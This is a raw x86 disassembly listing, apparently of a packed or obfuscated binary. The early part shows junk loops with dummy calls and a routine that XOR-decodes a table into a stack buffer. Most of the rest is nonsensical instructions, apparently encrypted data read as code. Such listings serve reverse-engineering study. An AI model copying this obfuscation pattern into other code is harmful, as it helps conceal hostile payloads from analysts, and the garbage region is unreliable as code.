  410265:	xor    ecx,DWORD PTR ds:0x4337df
  41026b:	or     DWORD PTR ds:0x4337d7,ecx
  410271:	mov    BYTE PTR [ebp-0x1],0x7f
  410275:	and    DWORD PTR ds:0x4337ab,0x0
  41027f:	jmp    0x410291
  410284:	mov    ecx,DWORD PTR ds:0x4337ab
  41028a:	inc    ecx
  41028b:	mov    DWORD PTR ds:0x4337ab,ecx
  410291:	cmp    DWORD PTR ds:0x4337ab,0x14
  410298:	jae    0x4102ed
  41029e:	cmp    DWORD PTR ds:0x4337ab,0xb
  4102a5:	jne    0x4102c6
  4102ab:	push   DWORD PTR [ebp-0x28]
  4102ae:	push   0x4636
  4102b3:	push   0x8d9e
  4102b8:	push   0x8baf
  4102bd:	push   DWORD PTR [ebp-0x18]
  4102c0:	call   DWORD PTR ds:0x412374
  4102c6:	cmp    DWORD PTR ds:0x4337ab,0xa
  4102cd:	jne    0x4102e2
  4102d3:	xor    ecx,ecx
  4102d5:	add    ecx,DWORD PTR ds:0x4337ab
  4102db:	inc    ecx
  4102dc:	mov    DWORD PTR ds:0x4337ab,ecx
  4102e2:	jmp    0x410284
  4102e7:	sbb    ecx,DWORD PTR ds:0x433703
  4102ed:	lea    eax,[ebp-0x1]
  4102f0:	mov    DWORD PTR [ebp-0x10],eax
  4102f3:	mov    al,BYTE PTR [ebp-0x1]
  4102f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4102f9:	sub    DWORD PTR ds:0x4337e7,0x43379f
  410303:	xor    al,0x46
  410305:	xor    DWORD PTR ds:0x4337e3,0x433797
  41030f:	sub    al,0x38
  410311:	mov    BYTE PTR [ecx],al
  410313:	movzx  ecx,WORD PTR ds:0x433757
  41031a:	sub    DWORD PTR ds:0x43371f,ecx
  410320:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  410327:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  41032e:	and    DWORD PTR ds:0x43375b,0x0
  410338:	mov    ecx,DWORD PTR ds:0x43375b
  41033e:	inc    ecx
  41033f:	mov    DWORD PTR ds:0x43375b,ecx
  410345:	cmp    DWORD PTR ds:0x43375b,0x25
  41034c:	jne    0x410362
  410352:	push   0x4338af
  410357:	push   0x4338ef
  41035c:	call   DWORD PTR ds:0x4120f4
  410362:	cmp    DWORD PTR ds:0x43375b,0x16
  410369:	jb     0x410338
  41036f:	adc    DWORD PTR ds:0x43379f,edx
  410375:	mov    eax,DWORD PTR [ebp-0x8]
  410378:	and    DWORD PTR ds:0x433813,0x0
  410382:	mov    ecx,DWORD PTR ds:0x433813
  410388:	inc    ecx
  410389:	mov    DWORD PTR ds:0x433813,ecx
  41038f:	cmp    DWORD PTR ds:0x433813,0xf
  410396:	jne    0x4103ac
  41039c:	push   0x4337e7
  4103a1:	push   0x178b
  4103a6:	call   DWORD PTR ds:0x412378
  4103ac:	cmp    DWORD PTR ds:0x433813,0xe
  4103b3:	jne    0x4103c8
  4103b9:	xor    ecx,ecx
  4103bb:	xor    ecx,DWORD PTR ds:0x433813
  4103c1:	inc    ecx
  4103c2:	mov    DWORD PTR ds:0x433813,ecx
  4103c8:	cmp    DWORD PTR ds:0x433813,0x1b
  4103cf:	jb     0x410382
  4103d5:	sub    DWORD PTR ds:0x43375f,edx
  4103db:	mov    ecx,0x7510854
  4103e0:	push   esi
  4103e1:	and    DWORD PTR ds:0x433757,0x0
  4103eb:	jmp    0x4103ff
  4103f0:	xor    esi,esi
  4103f2:	add    esi,DWORD PTR ds:0x433757
  4103f8:	inc    esi
  4103f9:	mov    DWORD PTR ds:0x433757,esi
  4103ff:	cmp    DWORD PTR ds:0x433757,0x1d
  410406:	jae    0x410427
  41040c:	cmp    DWORD PTR ds:0x433757,0x26
  410413:	jne    0x410422
  410419:	push   DWORD PTR [ebp-0x24]
  41041c:	call   DWORD PTR ds:0x4122b4
  410422:	jmp    0x4103f0
  410427:	xor    eax,ecx
  410429:	mov    esi,0x32729b
  41042e:	add    eax,esi
  410430:	jmp    0x41043d
  410435:	mov    dl,BYTE PTR [ebp-0x1]
  410438:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  41043c:	inc    eax
  41043d:	cmp    eax,0x40
  410440:	jb     0x410435
  410446:	mov    edx,DWORD PTR [ebp-0x8]
  410449:	mov    eax,DWORD PTR [ebp-0xc]
  41044c:	xor    edx,ecx
  41044e:	add    edx,esi
  410450:	cmp    edx,eax
  410452:	je     0x410766
  410458:	push   ebx
  410459:	push   edi
  41045a:	mov    edi,DWORD PTR [ebp+0x8]
  41045d:	mov    eax,0x8a3c
  410462:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410467:	mov    edi,0x3b02
  41046c:	add    ax,di
  41046f:	movzx  eax,ax
  410472:	mov    DWORD PTR [ebp-0x14],eax
  410475:	mov    eax,DWORD PTR [ebp+0x8]
  410478:	movzx  eax,WORD PTR [eax+edx*4]
  41047c:	xor    eax,0x8a3c
  410481:	add    eax,edi
  410483:	mov    edi,DWORD PTR [ebp-0x14]
  410486:	mov    BYTE PTR [ebp+edi*1-0x58],al
  41048a:	jmp    0x410758
  41048f:	cdq    
  410490:	outs   dx,BYTE PTR ds:[esi]
  410491:	mov    ds:0xa1f17118,eax
  410496:	outs   dx,DWORD PTR ds:[esi]
  410497:	or     BYTE PTR [edx],bl
  410499:	push   es
  41049a:	out    0xc8,al
  41049c:	bound  esp,QWORD PTR [ebp-0x2a]
  41049f:	fdiv   QWORD PTR [eax+0x7caf7e7e]
  4104a5:	jle    0x410525
  4104a7:	or     bl,BYTE PTR [ecx]
  4104a9:	push   0xffffffec
  4104ab:	mov    WORD PTR [ebx+0x3d2b8810],fs
  4104b1:	push   ebx
  4104b2:	cmp    al,0x24
  4104b4:	cmp    BYTE PTR [eax-0x10],bl
  4104b7:	cs xor ebp,eax
  4104ba:	outs   dx,DWORD PTR ds:[esi]
  4104bb:	add    eax,eax
  4104bd:	pop    ebp
  4104be:	sar    ah,1
  4104c0:	icebp  
  4104c1:	mov    ebp,0xe3edbb3e
  4104c6:	pop    eax
  4104c7:	outs   dx,DWORD PTR ds:[esi]
  4104c8:	pop    ecx
  4104c9:	xor    eax,0x32f406a8
  4104ce:	data16 mov ah,0xd0
  4104d1:	or     al,0xf4
  4104d3:	pop    ss
  4104d4:	push   edx
  4104d5:	mov    esp,0x3c06c632
  4104da:	sar    BYTE PTR [edx-0x55],cl
  4104dd:	inc    ecx
  4104de:	and    al,BYTE PTR [ebp-0x62c8ec46]
  4104e4:	pop    ecx
  4104e5:	push   ebp
  4104e6:	dec    edi
  4104e7:	in     eax,0xbf
  4104e9:	or     esp,DWORD PTR [eax+ebx*1]
  4104ec:	aas    
  4104ed:	inc    edx
  4104ee:	pop    esp
  4104ef:	cdq    
  4104f0:	inc    edi
  4104f1:	shr    BYTE PTR [ebx],1
  4104f3:	add    al,0xfc
  4104f5:	jl     0x4104eb
  4104f7:	and    cl,bh
  4104f9:	sub    ebx,ebp
  4104fb:	out    0xb7,eax
  4104fd:	pop    es
  4104fe:	mov    eax,0x7a51c7ee
  410503:	not    BYTE PTR [edx+0x8acac6d]
  410509:	out    dx,al
  41050a:	or     BYTE PTR [ebx],0x16
  41050d:	mov    dh,0x57
  41050f:	shl    DWORD PTR [eax],cl
  410511:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410512:	adc    BYTE PTR [edi],dl
  410514:	or     eax,0x7372fbb7
  410519:	lahf   
  41051a:	out    dx,al
  41051b:	push   ds
  41051c:	inc    ebp
  41051d:	push   esp
  41051e:	mov    bl,0xf1
  410520:	fmul   st(1),st
  410522:	lahf   
  410523:	(bad)  
  410524:	jmp    FWORD PTR [esp-0x175a8a7d]
  41052b:	push   ecx
  41052c:	push   esi
  41052d:	sbb    al,0x50
  41052f:	es push 0x35
  410532:	mov    edx,0x74dc1f80
  410537:	inc    edx
  410538:	cmp    eax,0x90b6f7d8
  41053d:	in     eax,dx
  41053e:	sub    eax,0xacc547e4
  410543:	dec    ebp
  410544:	fisubr DWORD PTR [ecx]
  410546:	jb     0x4104ce
  410548:	ins    BYTE PTR es:[edi],dx
  410549:	jp     0x410545
  41054b:	ss (bad) 
  41054d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41054e:	ja     0x4105bb
  410550:	jecxz  0x410544
  410552:	xor    bl,BYTE PTR [esi-0x7a61c3a6]
  410558:	pop    esp
  410559:	cwde   
  41055a:	mov    bl,0xdd
  41055c:	jno    0x4104ff
  41055e:	ror    BYTE PTR [esi-0x12],0x30
  410562:	xor    BYTE PTR [edx-0x1c],al
  410565:	popf   
  410566:	and    esi,esp
  410568:	in     eax,0x2d
  41056a:	mov    fs,eax
  41056c:	lods   al,BYTE PTR ds:[esi]
  41056d:	arpl   WORD PTR [edx-0x42],bp
  410570:	push   esi
  410571:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410572:	in     al,dx
  410573:	sbb    DWORD PTR [eax],ecx
  410575:	xchg   ecx,eax
  410576:	sbb    BYTE PTR [eax+0x51],0x1c
  41057a:	sub    ah,dl
  41057c:	pop    edi
  41057d:	xlat   BYTE PTR ds:[ebx]
  41057e:	and    DWORD PTR [ecx-0x24],0xcb8f9a8b
  410585:	pop    esp
  410586:	sub    edx,DWORD PTR [edi]
  410588:	ins    BYTE PTR es:[edi],dx
  410589:	loope  0x4105c5
  41058b:	dec    esp
  41058c:	sti    
  41058d:	xchg   edx,eax
  41058e:	push   esi
  41058f:	mov    BYTE PTR [ebx],ch
  410591:	cmp    al,0xd8
  410593:	push   esp
  410594:	dec    ecx
  410595:	aam    0x44
  410597:	sub    cl,BYTE PTR ds:0x518fbd08
  41059d:	inc    eax
  41059e:	adc    al,0x1b
  4105a0:	sbb    ebp,DWORD PTR [ecx-0xee9344b]
  4105a6:	jo     0x4105c6
  4105a8:	add    al,0x96
  4105aa:	arpl   sp,sp
  4105ac:	cdq    
  4105ad:	fisttp WORD PTR [esi-0x6cf7f304]
  4105b3:	imul   eax,esi,0xfffffffb
  4105b6:	adc    al,0xa0
  4105b8:	dec    edi
  4105b9:	push   eax
  4105ba:	sub    al,0x23
  4105bc:	ins    DWORD PTR es:[edi],dx
  4105bd:	jnp    0x4105e1
  4105bf:	out    dx,al
  4105c0:	loope  0x4105e5
  4105c2:	(bad)  
  4105c3:	loopne 0x4105af
  4105c5:	push   edx
  4105c6:	xchg   esp,eax
  4105c7:	mov    DWORD PTR [esi-0xc],edi
  4105ca:	int    0x8c
  4105cc:	xchg   edi,eax
  4105cd:	pop    ss
  4105ce:	and    dl,BYTE PTR [edx+0x5]
  4105d1:	(bad)  
  4105d2:	jg     0x4105bf
  4105d4:	push   es
  4105d5:	(bad)  
  4105d6:	cmp    al,0x6d
  4105d8:	fsub   QWORD PTR [esp+eiz*4+0xa0e44d5]
  4105df:	stos   BYTE PTR es:[edi],al
  4105e0:	icebp  
  4105e1:	inc    eax
  4105e2:	retf   0xe7ab
  4105e5:	ins    BYTE PTR es:[edi],dx
  4105e6:	test   al,0x88
  4105e8:	stos   BYTE PTR es:[edi],al
  4105e9:	push   ds
  4105ea:	out    dx,eax
  4105eb:	push   eax
  4105ec:	inc    eax
  4105ed:	pop    ebp
  4105ee:	jbe    0x4105f8
  4105f0:	dec    esi
  4105f1:	mov    ah,0x72
  4105f3:	or     DWORD PTR [edx],0x5d1899f5
  4105f9:	daa    
  4105fa:	mov    ah,0xa3
  4105fc:	clc    
  4105fd:	gs ss out dx,eax
  410600:	xchg   edi,eax
  410601:	fidiv  WORD PTR [ebx-0x1b]
  410605:	aas    
  410606:	mov    ah,0xf0
  410608:	sbb    al,BYTE PTR [edi-0x59]
  41060b:	dec    edx
  41060c:	adc    eax,DWORD PTR [ebp+0x5dc510b3]
  410612:	xchg   BYTE PTR [edi+0x4f],bl
  410615:	xchg   ebx,eax
  410616:	test   DWORD PTR ss:[edi],0xa3df5b19
  41061d:	daa    
  41061e:	hlt    
  41061f:	adc    ebx,DWORD PTR [edx+0x618ffbe9]
  410625:	or     BYTE PTR [esi],al
  410627:	inc    ebp
  410628:	in     al,0x81
  41062a:	jbe    0x410638
  41062c:	pop    esi
  41062d:	pop    ecx
  41062e:	jae    0x4105b0
  410630:	(bad)  
  410632:	fcmove st,st(1)
  410634:	jp     0x410608
  410636:	aad    0x63
  410638:	pusha  
  410639:	jns    0x4106b4
  41063b:	enter  0xd22d,0x3e
  41063f:	jg     0x410605
  410641:	stos   BYTE PTR es:[edi],al
  410642:	xor    al,0xe8
  410644:	repz neg DWORD PTR [ebp-0x2197a887]
  41064b:	std    
  41064c:	ret    
  41064d:	mov    esp,0xbf2e6b13
  410652:	cs add eax,0xb88d6972
  410658:	das    
  410659:	leave  
  41065a:	stc    
  41065b:	mov    bh,0xd1
  41065d:	retf   
  41065e:	pusha  
  41065f:	leave  
  410660:	retf   
  410661:	or     eax,0xf58c826b
  410666:	add    al,0x22
  410668:	pop    ebx
  410669:	ret    0x8ea6
  41066c:	test   al,0x9d
  41066e:	push   ecx
  41066f:	mov    ebp,0x5b23e062
  410674:	push   es
  410675:	rcl    DWORD PTR [ebx+0x31300b60],0x91
  41067c:	data16 loop 0x410686
  41067f:	jp     0x410685
  410681:	dec    edi
  410682:	es dec esi
  410684:	fst    DWORD PTR [edi]
  410686:	jb     0x410637
  410688:	jg     0x410675
  41068a:	cli    
  41068b:	mov    eax,ds:0x6cdae18
  410690:	sar    DWORD PTR [eax+0x1bb24d81],0x40
  410697:	add    ebp,DWORD PTR [edi]
  410699:	pop    ebp
  41069a:	jmp    0x41065d
  41069c:	in     eax,0x98
  41069e:	stos   BYTE PTR es:[edi],al
  41069f:	fdiv   DWORD PTR [ebp+0x3c90f934]
  4106a5:	(bad)  
  4106a6:	(bad)  
  4106a7:	adc    DWORD PTR [esi+eiz*4+0x3329ca9d],0x6e
  4106af:	imul   ecx,DWORD PTR ds:[ebx-0x2c],0x3b0b4b40
  4106b7:	fsubrp st(0),st
  4106b9:	and    al,0xf6
  4106bb:	mov    edx,0xb4e886b9
  4106c0:	xor    ah,ah
  4106c2:	inc    eax
  4106c3:	cmp    DWORD PTR [eax+0x6db60950],ebx
  4106c9:	mov    dl,0x3f
  4106cb:	(bad)  
  4106cc:	in     al,0x3f
  4106ce:	scas   al,BYTE PTR es:[edi]
  4106cf:	stos   BYTE PTR es:[edi],al
  4106d0:	sbb    edi,ebp
  4106d2:	pop    ss
  4106d3:	jbe    0x41067c
  4106d5:	pop    esp
  4106d6:	dec    esp
  4106d7:	adc    ebp,DWORD PTR [ebp+0x7f373efb]
  4106dd:	sub    DWORD PTR [ebx+edi*8+0x40],0x79f5f829
  4106e5:	(bad)  
  4106e7:	in     eax,0xf5
  4106e9:	mov    ebx,0x942287f3
  4106ee:	jns    0x410766
  4106f0:	inc    esp
  4106f1:	call   0xb832:0x110556c1
  4106f8:	test   eax,0xbe8bac97
  4106fd:	daa    
  4106fe:	imul   eax,DWORD PTR [eax+eax*8-0x1d],0xa27e53f4
  410706:	mov    ds,esp
  410708:	arpl   WORD PTR [edx],cx
  41070a:	fmul   QWORD PTR [edi-0x31]
  41070d:	sbb    BYTE PTR [ecx+0x43],ah
  410710:	sub    ch,BYTE PTR [esi-0x52a985aa]
  410716:	imul   esi,ebp,0x70
  410719:	dec    esp
  41071a:	js     0x41073b
  41071c:	push   esp
  41071d:	cdq    
  41071e:	jnp    0x410700
  410720:	pop    esi
  410721:	inc    DWORD PTR [edx+0x4]
  410724:	xchg   DWORD PTR [esi+0x36279c31],ebp
  41072a:	lock lods eax,DWORD PTR ds:[esi]
  41072c:	mov    ebx,0xba03c568
  410731:	(bad)  
  410733:	pop    ds
  410734:	loope  0x41079f
  410736:	push   ebx
  410737:	add    ch,0x86
  41073a:	test   eax,0xb74de5b5
  41073f:	pop    ebp
  410740:	ja     0x4107be
  410742:	in     eax,dx
  410743:	push   es
  410744:	lock xor ebp,0xffffffbe
  410748:	jge    0x41078e
  41074a:	pop    edi
  41074b:	fs pushf 
  41074d:	push   0xdee790d9
  410752:	clc    
  410753:	sahf   
  410754:	out    0x88,al
  410756:	push   es
  410757:	add    eax,0x42f4458b
  41075c:	cmp    edx,eax
  41075e:	jne    0x41045a
  410764:	pop    edi
  410765:	pop    ebx
  410766:	mov    eax,DWORD PTR [ebp-0x8]
  410769:	mov    edx,DWORD PTR [ebp+0x10]
  41076c:	xor    eax,ecx
  41076e:	jmp    0x410a3c
  410773:	mov    ds:0x6929ab51,eax
  410778:	icebp  
  410779:	mov    eax,ds:0x2251d751
  41077e:	and    eax,0xaba9f40d
  410783:	or     eax,0xaf7e7ebf
  410788:	jl     0x410808
  41078a:	jle    0x410770
  41078c:	jg     0x4107fd
  41078e:	gs mov eax,0x4397ec22
  410794:	cmp    ebx,DWORD PTR [edx-0x43]
  410797:	jle    0x4107e1
  410799:	sahf   
  41079a:	add    BYTE PTR [edi-0x2f],dl
  41079d:	test   dl,bh
  41079f:	fild   WORD PTR [eax-0x58]
  4107a2:	cmp    ah,ah
  4107a4:	jmp    0x4107fe
  4107a6:	adc    ebp,ecx
  4107a8:	ins    BYTE PTR es:[edi],dx
  4107a9:	(bad)  [eax]
  4107ab:	outs   dx,DWORD PTR ds:[esi]
  4107ac:	push   0xdc0a2a8
  4107b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107b2:	sbb    BYTE PTR [esi+0x72b0c3f4],dl
  4107b8:	mov    BYTE PTR [ebx-0x148cbd10],cl
  4107be:	xlat   BYTE PTR ds:[ebx]
  4107bf:	xor    eax,0x513fef57
  4107c4:	xor    eax,0x79bd7f6b
  4107c9:	fs jno 0x4107df
  4107cc:	les    ecx,FWORD PTR [ebx]
  4107ce:	inc    eax
  4107cf:	inc    ebx
  4107d0:	jle    0x41078d
  4107d2:	lahf   
  4107d3:	mov    edx,0x67a5cb7f
  4107d8:	sub    DWORD PTR [edi],0x1b996181
  4107de:	push   edi
  4107df:	loope  0x4107c3
  4107e1:	enter  0x32d1,0x68
  4107e5:	jae    0x4107b5
  4107e7:	xor    edx,edx
  4107e9:	rol    DWORD PTR [ecx-0x4b],1
  4107ec:	(bad)  
  4107ed:	in     al,0x23
  4107ef:	dec    esp
  4107f0:	lds    ecx,FWORD PTR [esi+0x51]
  4107f3:	fdivr  QWORD PTR [esi+eiz*4-0x5a50609e]
  4107fa:	scas   eax,DWORD PTR es:[edi]
  4107fb:	dec    ecx
  4107fc:	add    BYTE PTR [ecx],dh
  4107fe:	push   0x20
  410800:	pop    ecx
  410801:	lahf   
  410802:	dec    ecx
  410803:	jbe    0x41085c
  410805:	sti    
  410806:	arpl   si,ax
  410808:	cwde   
  410809:	cld    
  41080a:	leave  
  41080b:	sahf   
  41080c:	xchg   esi,eax
  41080d:	jp     0x41085d
  41080f:	jmp    0x410850
  410811:	pop    ss
  410812:	div    BYTE PTR [eax]
  410814:	sbb    al,0xca
  410816:	add    BYTE PTR [eax+esi*2-0x6d08f69a],bh
  41081d:	or     ecx,0x5a
  410820:	outs   dx,DWORD PTR ds:[esi]
  410821:	arpl   ax,ax
  410823:	or     bh,BYTE PTR [edi+edi*1-0x4f43ca5c]
  41082a:	mov    ecx,0x598677de
  41082f:	xor    al,0xfe
  410831:	mov    ch,bl
  410833:	stc    
  410834:	dec    edx
  410835:	icebp  
  410836:	retf   0x57d6
  410839:	push   ss
  41083a:	test   al,0xc0
  41083c:	or     DWORD PTR [ebp-0x37],esp
  41083f:	enter  0x58b1,0xdc
  410843:	(bad)  
  410844:	psubsw mm0,QWORD PTR [edi]
  410847:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410848:	mov    WORD PTR [ebx-0x6351849e],cs
  41084e:	test   DWORD PTR [ebx],ebx
  410850:	les    ecx,FWORD PTR ds:0x9a866097
  410856:	cmp    DWORD PTR [eax],0xffffffb7
  410859:	mov    bh,0x3
  41085b:	push   ecx
  41085c:	enter  0xd415,0x40
  410860:	mov    al,ds:0x2372851e
  410865:	mov    eax,0x3b71f5
  41086a:	sbb    BYTE PTR [edx+eiz*2-0x2a],bl
  41086e:	or     BYTE PTR [ebp-0x3a],dh
  410871:	jbe    0x410859
  410873:	pop    edx
  410874:	out    dx,al
  410875:	mov    ebx,0x1081f43e
  41087a:	xor    DWORD PTR [ebx],edx
  41087c:	(bad)  
  41087d:	xor    BYTE PTR [ecx+0x340cc0ff],al
  410883:	shl    BYTE PTR [esi],0x86
  410886:	push   edi
  410887:	mov    edi,0xf07ff744
  41088c:	mov    edx,0x74f57d7b
  410891:	lods   al,BYTE PTR ds:[esi]
  410892:	and    BYTE PTR [eax-0x30c35c11],0x10
  410899:	pop    ebp
  41089a:	push   eax
  41089b:	out    dx,eax
  41089c:	jl     0x41085a
  41089e:	cmp    DWORD PTR [esi],0xffffffa2
  4108a1:	es pushf 
  4108a3:	push   0x230aa106
  4108a8:	dec    ecx
  4108a9:	fcmovb st,st(1)
  4108ab:	rol    BYTE PTR [edi],cl
  4108ad:	adc    esp,DWORD PTR [edx]
  4108af:	or     DWORD PTR [eax],ecx
  4108b1:	test   al,0xac
  4108b3:	mov    ds:0xa2398149,eax
  4108b8:	shr    DWORD PTR [esi],cl
  4108ba:	adc    eax,0xe6cd122e
  4108bf:	push   0xffffff86
  4108c1:	aas    
  4108c2:	(bad)  
  4108c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108c4:	test   BYTE PTR [ebp+0x65],0x39
  4108c8:	mov    eax,ds:0x7850f8d3
  4108cd:	and    BYTE PTR [eax],cl
  4108cf:	in     eax,0xd4
  4108d1:	fdiv   QWORD PTR [edi-0x2a20cc81]
  4108d7:	inc    ebp
  4108d8:	es xchg esi,eax
  4108da:	mov    BYTE PTR [ebx],al
  4108dc:	mov    esi,0xcd4087ca
  4108e1:	jns    0x410926
  4108e3:	sub    ebp,DWORD PTR [edi-0x6d]
  4108e6:	sbb    eax,0x750ae203
  4108eb:	test   al,0xd
  4108ed:	push   ds
  4108ee:	outs   dx,BYTE PTR ds:[esi]
  4108ef:	push   ecx
  4108f0:	mov    esi,0x3d6e1150
  4108f5:	shr    bh,0x7b
  4108f8:	lea    ebx,[ecx+0x508e0ff3]
  4108fe:	aaa    
  4108ff:	mov    eax,ds:0x8c82c093
  410904:	sub    esp,ebx
  410906:	add    BYTE PTR ds:0x84b6bc4b,ah
  41090c:	mov    eax,ds:0x13846aca
  410911:	stos   DWORD PTR es:[edi],eax
  410912:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410913:	adc    ebp,DWORD PTR [ebp+0x3de42bcf]
  410919:	gs fucomip st,st(4)
  41091c:	retf   0xfdb1
  41091f:	xchg   ebp,eax
  410920:	push   DWORD PTR [ebx-0x26f6a3c0]
  410926:	and    eax,0xcdfe5340
  41092b:	stos   DWORD PTR es:[edi],eax
  41092c:	add    al,0x21
  41092e:	test   BYTE PTR ds:0x7072dbd5,cl
  410934:	mov    al,0xee
  410936:	pop    esp
  410937:	daa    
  410938:	xchg   esi,eax
  410939:	dec    eax
  41093a:	jnp    0x4109b2
  41093c:	test   al,0x89
  41093e:	sub    edx,edi
  410940:	ds test al,0xad
  410943:	xor    dh,al
  410945:	and    DWORD PTR [esi],edi
  410947:	(bad)  
  410948:	mov    dh,0x9c
  41094a:	arpl   WORD PTR [edx+0x57],dx
  41094d:	gs pop esi
  41094f:	push   es
  410950:	xchg   BYTE PTR [ebx+0x6a7da3f],ch
  410956:	pusha  
  410957:	pop    ss
  410958:	xlat   BYTE PTR ds:[ebx]
  410959:	nop
  41095a:	add    ch,ah
  41095c:	fisubr WORD PTR [ebx-0x74a19b93]
  410962:	aaa    
  410963:	fwait
  410964:	sub    BYTE PTR [edi+ebp*8+0x2a1fa6fa],cl
  41096b:	sar    DWORD PTR [esi],cl
  41096d:	jg     0x41093a
  41096f:	mov    ch,0xd8
  410971:	cwde   
  410972:	daa    
  410973:	stos   BYTE PTR es:[edi],al
  410974:	in     eax,0xae
  410976:	jns    0x41091a
  410978:	cld    
  410979:	repz das 
  41097b:	and    dh,0x1a
  41097e:	push   ebp
  41097f:	sub    DWORD PTR [edi-0x319fead4],esp
  410985:	pop    eax
  410986:	adc    dl,0x16
  410989:	ror    DWORD PTR [edx+0x7c2a5add],cl
  41098f:	not    dh
  410991:	stc    
  410992:	adc    eax,0x4a14b509
  410997:	cdq    
  410998:	add    eax,0x57a86104
  41099d:	xchg   edi,eax
  41099e:	inc    edx
  41099f:	cs xchg ecx,eax
  4109a1:	imul   BYTE PTR [ebx-0xc]
  4109a4:	mov    eax,0x2f9441ca
  4109a9:	repz xlat BYTE PTR ds:[ebx]
  4109ab:	(bad)  
  4109ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109ad:	sbb    al,0x76
  4109af:	xor    DWORD PTR [esi],ecx
  4109b1:	ins    DWORD PTR es:[edi],dx
  4109b2:	push   esp
  4109b3:	fxch   st(6)
  4109b5:	retf   0x5464
  4109b8:	mov    ch,0x87
  4109ba:	outs   dx,DWORD PTR ds:[esi]
  4109bb:	sbb    BYTE PTR [esi],0x34
  4109be:	push   0xaf10d5fa
  4109c3:	mov    ds:0x8fc08e55,eax
  4109c8:	mov    DWORD PTR [ebp-0x32],ebx
  4109cb:	adc    DWORD PTR [edx+esi*1-0x3a],ebp
  4109cf:	stos   DWORD PTR es:[edi],eax
  4109d0:	jae    0x4109d0
  4109d2:	xlat   BYTE PTR ds:[ebx]
  4109d3:	fstp   QWORD PTR [esi+0x55]
  4109d6:	push   edx
  4109d7:	mov    ecx,0x36ba8582
  4109dc:	inc    esi
  4109dd:	jle    0x4109ef
  4109df:	cs call 0x9a5d8b98
  4109e5:	or     ebp,eax
  4109e7:	fcmovu st,st(7)
  4109e9:	and    DWORD PTR [esi+0x78d17484],ebp
  4109ef:	popf   
  4109f0:	retf   
  4109f1:	pop    ds
  4109f2:	leave  
  4109f3:	xchg   BYTE PTR [ebp-0x37c35d0a],cl
  4109f9:	sti    
  4109fa:	xchg   ebx,eax
  4109fb:	std    
  4109fc:	out    0x8,eax
  4109fe:	into   
  4109ff:	sbb    al,0xca
  410a01:	and    eax,0xbd015ab9
  410a06:	pop    edi
  410a07:	jmp    0x6d97:0x9a5076b0
  410a0e:	adc    al,0x97
  410a10:	outs   dx,BYTE PTR ds:[esi]
  410a11:	jecxz  0x410a64
  410a13:	and    DWORD PTR [edi+ebp*2-0x8646adc],edx
  410a1a:	dec    ebp
  410a1b:	mov    ecx,0x265224ab
  410a20:	dec    ebx
  410a21:	aad    0x5a
  410a23:	inc    ebx
  410a24:	xor    al,0x2
  410a26:	xchg   ecx,eax
  410a27:	imul   ebp,DWORD PTR [ebp-0x12],0xffffffda
  410a2b:	add    DWORD PTR [esi+0x52ce0f8],eax
  410a31:	data16 xchg BYTE PTR fs:[ecx+0x3b],ah
  410a36:	sub    eax,0x8619210
  410a3b:	mov    ah,0x3
  410a3d:	(bad)  
  410a3e:	jmp    0x410d0c
  410a43:	add    dh,BYTE PTR [edx]
  410a45:	fdiv   QWORD PTR fs:[eax+ebp*2-0x7e]
  410a4a:	lock pop eax
  410a4c:	(bad)  
  410a4d:	xchg   esp,eax
  410a4e:	pop    esi
  410a4f:	lock xor DWORD PTR ds:0x7ebdba5c,0x7e
  410a57:	scas   eax,DWORD PTR es:[edi]
  410a58:	jl     0x410ad8
  410a5a:	jle    0x410a59
  410a5c:	rcr    DWORD PTR [edi+0x7649c6f5],1
  410a62:	sub    ebp,DWORD PTR ds:0x1bd480e7
  410a68:	add    DWORD PTR [ebx+0x5bba0654],ebp
  410a6e:	jno    0x410aea
  410a70:	shl    DWORD PTR [ebx],cl
  410a72:	pop    edx
  410a73:	cwde   
  410a74:	call   0xe8b7:0xd642b78c
  410a7b:	fnstenv [ecx-0x16]
  410a7e:	in     al,dx
  410a7f:	xor    DWORD PTR [edi-0x21],edx
  410a82:	sub    BYTE PTR [edi-0x2c0b46eb],al
  410a88:	mov    ch,0x1d
  410a8a:	mov    esp,0x5d573d43
  410a8f:	(bad)  
  410a90:	jno    0x410a1c
  410a92:	push   0x2e
  410a94:	pop    es
  410a95:	(bad)  
  410a96:	add    BYTE PTR [ecx],cl
  410a98:	lods   al,BYTE PTR ds:[esi]
  410a99:	fistp  QWORD PTR [esi+0x53648b71]
  410a9f:	test   ch,0x55
  410aa2:	adc    ch,BYTE PTR [ebx+0x48413194]
  410aa8:	sbb    DWORD PTR [ecx],edx
  410aaa:	sub    eax,0x39331530
  410aaf:	or     dh,BYTE PTR [ecx-0x4c]
  410ab2:	sbb    bl,BYTE PTR [esi]
  410ab4:	xchg   ebx,eax
  410ab5:	mov    ebp,ebp
  410ab7:	jnp    0x410af3
  410ab9:	cmp    DWORD PTR [esi],edx
  410abb:	ins    DWORD PTR es:[edi],dx
  410abc:	in     al,dx
  410abd:	ret    0x1597
  410ac0:	cmp    DWORD PTR [eax+0x13d7cce6],ebp
  410ac6:	lds    esi,FWORD PTR [esi-0x51545c20]
  410acc:	sub    al,0x69
  410ace:	xchg   ebp,eax
  410acf:	xchg   esi,eax
  410ad0:	(bad)  
  410ad1:	push   ds
  410ad2:	jb     0x410aeb
  410ad4:	inc    esp
  410ad5:	shr    ebx,0xfb
  410ad8:	rol    DWORD PTR [ebx-0x6a],0xaf
  410adc:	push   ebp
  410add:	cld    
  410ade:	in     eax,dx
  410adf:	cs xchg edi,eax
  410ae1:	fwait
  410ae2:	rol    DWORD PTR [eax-0x6],cl
  410ae5:	lds    eax,FWORD PTR [esi-0x32bb2d56]
  410aeb:	inc    esi
  410aec:	sub    ecx,DWORD PTR [esi]
  410aee:	loop   0x410b3e
  410af0:	imul   ebx,edx,0x131e2307
  410af6:	ds aas 
  410af8:	sbb    al,0xa6
